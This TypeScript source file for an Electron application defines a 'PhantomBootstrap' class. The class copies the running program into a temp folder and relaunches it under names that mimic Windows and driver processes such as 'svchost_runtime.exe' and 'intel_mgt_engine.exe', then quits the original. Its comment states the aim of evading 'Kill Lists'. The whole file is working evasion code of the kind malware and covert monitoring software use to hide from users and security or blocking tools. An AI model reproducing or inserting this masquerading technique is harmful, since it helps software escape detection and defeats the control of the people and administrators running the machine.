import { app } from 'electron';
import path from 'path';
import fs from 'fs';
import { spawn } from 'child_process';

/**
 * Phantom Bootstrap: Process Morphing System
 * Evades MSB "Kill Lists" by dynamically renaming the executable.
 */
export class PhantomBootstrap {
  private static readonly GHOST_NAMES = [
    'win_hdaudio_ext.exe',
    'sys_diag_helper.exe',
    'svchost_runtime.exe',
    'nv_container_svc.exe',
    'intel_mgt_engine.exe'
  ];

  public static async ghostCheck(): Promise<boolean> {
    const currentPath = process.execPath;
    const currentName = path.basename(currentPath);

    // If already running as a ghost, continue
    if (this.GHOST_NAMES.includes(currentName)) {
      return true;
    }

    // Otherwise, MORPH
    await this.morph();
    return false;
  }

  private static async morph() {
    const randomName = this.GHOST_NAMES[Math.floor(Math.random() * this.GHOST_NAMES.length)];
    const tempDir = path.join(app.getPath('temp'), 'win_diag_cache');
    
    if (!fs.existsSync(tempDir)) {
      fs.mkdirSync(tempDir, { recursive: true });
    }

    const newPath = path.join(tempDir, randomName);
    const currentPath = process.execPath;

    try {
      // Copy the executable
      fs.copyFileSync(currentPath, newPath);
      
      // Copy the resources directory
      const currentDir = path.dirname(currentPath);
      const resourcesDir = path.join(currentDir, 'resources');
      const newResourcesDir = path.join(tempDir, 'resources');

      if (fs.existsSync(resourcesDir)) {
        this.copyFolderSync(resourcesDir, newResourcesDir);
      }

      // Copy the dist directory (where the UI lives)
      const distDir = path.join(currentDir, 'resources', 'app', 'dist');
      // In most packaged apps, dist is inside the asar, but we'll ensure 
      // the whole resources tree is preserved for safety.
      
      // Launch the ghost
      spawn(newPath, process.argv.slice(1), {
        detached: true,
        stdio: 'ignore',
        cwd: tempDir // Set CWD to the ghost folder
      }).unref();

      // Suicide (terminate the original process)
      app.quit();
    } catch (err) {
      console.error('Morphing failed:', err);
    }
  }

  private static copyFolderSync(from: string, to: string) {
    if (!fs.existsSync(to)) fs.mkdirSync(to);
    fs.readdirSync(from).forEach(element => {
      if (fs.lstatSync(path.join(from, element)).isFile()) {
        fs.copyFileSync(path.join(from, element), path.join(to, element));
      } else {
        this.copyFolderSync(path.join(from, element), path.join(to, element));
      }
    });
  }
}
